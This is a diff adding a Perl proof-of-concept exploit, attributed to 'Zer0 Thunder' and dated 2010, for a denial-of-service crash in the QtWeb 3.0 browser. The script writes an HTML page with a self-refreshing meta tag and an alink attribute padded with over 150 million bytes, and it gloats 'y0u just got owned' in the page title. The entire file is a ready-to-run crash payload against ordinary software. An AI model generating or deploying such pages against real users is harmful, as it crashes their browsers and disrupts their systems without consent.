@@ -1,0 +1,45 @@
+#!/usr/bin/perl
+# File Name :QtWeb Web Browser 
+# Vuln : Remote Dos/Crash
+# Auther : Zer0 Thunder
+# Msn : zer0_thunder@colombohackers.com
+#
+# Look at the task manager after u run this 
+##==------>> 
+#
+# Exploit Title: QtWeb 3.0 Remote DoS/Crash Exploit 
+# Date: 22/01/2010
+# Author: Zer0 Thunder
+# Site  : http://www.qtweb.net/
+# Software Link: http://qtweb.googlecode.com/files/QtWeb-3.0.zip
+# Version: v 3.0
+# Tested on: Windows XP Sp2 / .html was uploaded into a Ubuntu Server
+#			 Also tested locally
+#
+##==------>> 
+$file="zero_qbrwoser.html";
+print " ======================================\n";
+print " = QtWeb 3.0 Remote DoS/Crash Exploit =\n";
+print " =                                    =\n";
+print " ======================================\n"; 
+print "\n";
+print " Please Wait till c0de generate...\n";
+my $buffer="\x41" x 100000000; #Buffer 
+my $buffer_1="\42" x 55900000;
+my $tit="\x5A\x65\x72\x30\x0\x54\x68\x75\x6E\x64\x65\x72"; # lol on this
+open(myfile,">>$file"); # b00m on here
+print myfile "<html>";
+print myfile "<title> y0u just got owned by $tit </title>";
+print myfile '<head><meta http-equiv="refresh" content="1; url=zero_qbrwoser.html"></head>';
+print myfile "<body alink=";
+print myfile $buffer,$buffer_1;
+print myfile '">';
+print myfile "</html>";
+close(myfile);
+print "\n";
+print " File Name : $file\n";
+print " File Created Succesfully \n";
+print "\n";
+print "----------------------------------------------------------------------\n";
+print " Founder : $tit\n";
+print " For more information ==- msn : zer0_thunder[at]colombohackers[dot]com\n";
